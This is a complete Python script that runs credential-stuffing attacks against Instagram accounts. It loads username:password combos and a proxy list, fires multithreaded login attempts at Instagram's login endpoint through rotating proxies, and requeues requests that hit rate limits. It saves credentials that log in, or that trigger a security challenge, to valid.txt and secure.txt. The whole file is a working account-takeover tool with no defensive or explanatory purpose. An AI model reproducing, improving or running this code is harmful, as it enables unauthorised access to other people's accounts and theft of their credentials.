import requests , threading , random  , ctypes , socket
from queue import Queue
from colorama import Fore , init
init(autoreset=True)
class Threads:
    def thread(self, thread, function):
        for _ in range(thread):
            threading.Thread(target=function).start()
class HTTP:
    def http_request(self, request, url, headers, data, proxy):
        if request == 'POST':
            if data and not proxy:
                return requests.post(url, headers=headers, data=data)
            elif data and proxy:
                return requests.post(url, headers=headers, data=data, proxies=proxy)
        elif request == 'GET':
            if not proxy:
                return requests.get(url, headers=headers)
            if proxy:
                return requests.get(url, headers=headers, proxies=proxy)
class Color:
    def color(self, color, text):
        if color == 'MAGENTA':
            return Fore.LIGHTMAGENTA_EX + text + Fore.RESET
        elif color == 'GREEN':
            return Fore.LIGHTGREEN_EX + text + Fore.RESET
        elif color == 'RED':
            return Fore.LIGHTRED_EX + text + Fore.RESET
        elif color == 'RESET':
            return Fore.RESET
class Files:
    def __init__(self):
        self.c = Color()
    def check_file_proxies(self, name_file='proxies.txt'):
        try:
            open(name_file).read().splitlines()
            print("[" + self.c.color("GREEN","+") + f"] Successfully Loaded '{self.c.color('GREEN','proxies.txt')}'")
            if len(open(name_file).read().splitlines()) == 0:
                print("[" + self.c.color("GREEN","+") + f"] Please Open File '{self.c.color('GREEN','proxies.txt')}' And Enter Proxies\n[{self.c.color('GREEN','+')}] Press Enter To Exit")
                input()
                exit(0)
            else:
                pass
        except FileNotFoundError:
            self.create_file_proxies = open('proxies.txt', 'a')
            print("[" + self.c.color("GREEN","+") + f"] Successfully Create File '{self.c.color('GREEN','proxies.txt')}'\n[{self.c.color('GREEN','+')}] Please Open File '{self.c.color('GREEN','proxies.txt')}' And Enter Proxies\n[{self.c.color('GREEN','+')}] Press Enter To Exit")
            input()
            exit(0)
    def check_file_combo(self, name_file='combo.txt'):
        try:
            open(name_file).read().splitlines()
            print("[" + self.c.color("GREEN","+") + f"] Successfully Loaded '{self.c.color('GREEN','combo.txt')}'")
            if len(open(name_file).read().splitlines()) == 0:
                print("[" + self.c.color("GREEN","+") + f"] Please Open File '{self.c.color('GREEN','combo.txt')}' And Enter Combo\n[{self.c.color('GREEN','+')}] Press Enter To Exit")
                input()
                exit(0)
            else:
                pass
        except FileNotFoundError:
            self.create_file_proxies = open('combo.txt', 'a')
            print("[" + self.c.color("GREEN","+") + f"] Successfully Create File '{self.c.color('GREEN','combo.txt')}'\n[{self.c.color('GREEN','+')}] Please Open File '{self.c.color('GREEN','combo.txt')}' And Enter Combo\n[{self.c.color('GREEN','+')}] Press Enter To Exit")
            input()
            exit(0)
class Instagram:
    def __init__(self):
        self.Color = Color()
        self.HTTP = HTTP()
        self.Files = Files()
        self.q = Queue()
        self.valid = 0
        self.bad_password = 0
        self.secure = 0
        self.error = 0
        self.N = 0
        self.headers = {'accept': '*/*', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36', 'x-csrftoken': 'missing'}
    def Use_Queue(self):
        self.open_file_combo = open('combo.txt').read().splitlines()
        for self.combo_list in self.open_file_combo:
            self.q.put(self.combo_list)
    def Started(self):
        while not self.q.empty() and self.N == 0:
            combo = self.q.get()
            self.InstagramBruteForce(combo)
        if self.q.empty() and self.N == 0:
            self.N = 1
            print("\n[" + self.Color.color("GREEN","+") + f"] Successfully Check All Account '{self.Color.color('GREEN','combo.txt')}'\n[{self.Color.color('GREEN','+')}] Press Enter To Exit")
            input()
            exit(0)
    def saved(self, username, password, status):
        with open(status, 'a') as self.saved_file:
            self.saved_file.write(username + ':' + password + '\n')
    def InstagramBruteForce(self, combo):
        self.username = combo.split(':')[0]
        self.password = combo.split(':')[1]
        self.data = {'username': self.username, 'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:' + self.password, 'queryParams': '{}', 'optIntoOneTap': 'false'}
        try:
            self.req = self.HTTP.http_request('POST', 'https://www.instagram.com/accounts/login/ajax/', self.headers, self.data, {'http': f'http://{random.choice(open("proxies.txt").read().splitlines())}', 'https': f'http://{random.choice(open("proxies.txt").read().splitlines())}', 'socks4': f'http://{random.choice(open("proxies.txt").read().splitlines())}', 'socks5': f'http://{random.choice(open("proxies.txt").read().splitlines())}'})
            if 'userId' in self.req.text:
                self.valid +=1
                ctypes.windll.kernel32.SetConsoleTitleW(str('\rValid {} | Bad {} | Secure {} | Error {}'.format(self.valid, self.bad_password, self.secure, self.error)))
                self.saved(self.username, self.password, 'valid.txt')
            elif '"authenticated":false' in self.req.text:
                self.bad_password +=1
                ctypes.windll.kernel32.SetConsoleTitleW(str('\rValid {} | Bad {} | Secure {} | Error {}'.format(self.valid, self.bad_password, self.secure, self.error)))
            elif '/challenge' in self.req.text:
                self.secure +=1
                ctypes.windll.kernel32.SetConsoleTitleW(str('\rValid {} | Bad {} | Secure {} | Error {}'.format(self.valid, self.bad_password, self.secure, self.error)))
                self.saved(self.username, self.password, 'secure.txt')
            elif self.req.status_code == 429:
                self.error +=1
                ctypes.windll.kernel32.SetConsoleTitleW(str('\rValid {} | Bad {} | Secure {} | Error {}'.format(self.valid, self.bad_password, self.secure, self.error)))
                self.q.put(combo)
            else:
                self.error +=1
                self.q.put(combo)
        except:
            self.q.put(combo)
if __name__ == '__main__':
    CColor = Color()
    F = Files()
    F.check_file_combo()
    F.check_file_proxies()
    I = Instagram()
    I.Use_Queue()
    T = Threads()
    print(f'[{CColor.color("GREEN","+")}] Thread : ', end='')
    threadc = int(input())
    while 1:
        try:
            T.thread(threadc, I.Started)
        except:
            pass
